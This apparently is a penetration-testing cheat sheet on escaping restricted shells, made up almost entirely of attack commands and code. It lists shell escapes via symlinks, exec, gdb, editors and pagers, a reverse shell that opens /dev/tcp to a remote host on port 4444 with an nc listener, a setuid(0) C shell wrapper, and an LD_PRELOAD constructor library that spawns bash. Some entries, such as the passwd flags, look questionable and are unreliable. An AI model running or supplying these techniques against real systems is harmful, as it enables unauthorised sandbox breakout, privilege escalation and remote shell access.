--------------------------------------------------
Restricted environment
--------------------------------------------------

### is it really?
```bash
echo $0
# check availability of a given "command"
type -a command
```
list commands
```bash
compgen -c
```

### escape!
symlink to bash
```bash
ln -sf /bin/bash restricted_shell
```
interactive bash
```bash
bash -i
```
exec
```bash
exec /bin/bash
```
fix tty
```bash
stty raw -echo; fg; export SHELL=/bin/bash; export TERM=xterm-256color; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp; stty rows 52 columns 208; reset;
```
execute commands before entering the shell
```bash
ssh user@10.10.10.10 -t "bash -l"
```
use a debugger
```bash
gdb -p $$ 
# type the following command inside the debugger
! /bin/sh
```
SUID binaries, for example "passwd"
```bash
passwd -r compat -s
```
write to a file
```bash
#!/bin/bash
/bin/bash
```
shell command substitution
```bash
echo $'$(/bin/bash)'
```
reverse shell
```bash
nc -lvp 4444
/bin/bash -c 'exec 5<>/dev/tcp/remote_ip/4444;cat <&5 | while read line; do $line 2>&5 >&5; done'
```
cmd editor - `ed` `vi` `vim` `nano`
```bash
# save and exit after putting the following command. will get a shell with elevated privs
:!bash
```
pager commands
```bash
# Open a file long enough to fit in more than one screen with any of the pagers more, less and simply type 
!'sh'
# works with `man` as well
```
Use a custom library #1
```C
/* myshell.c */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
```
```bash
gcc -o myshell myshell.c
./myshell
```
Use a custom library #2
```c
/* create a shared object - inject.c */
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("/bin/bash");
}
```
```bash
# compile the C code
gcc -fPIC -shared -o libinject.so inject.c
```
```bash
# set the LD_PRELOAD environment variable to the full path of the shared object file, and run the restricted binary to execute a new shell with elevated privileges
export LD_PRELOAD=/path/to/libinject.so
restricted_binary
```
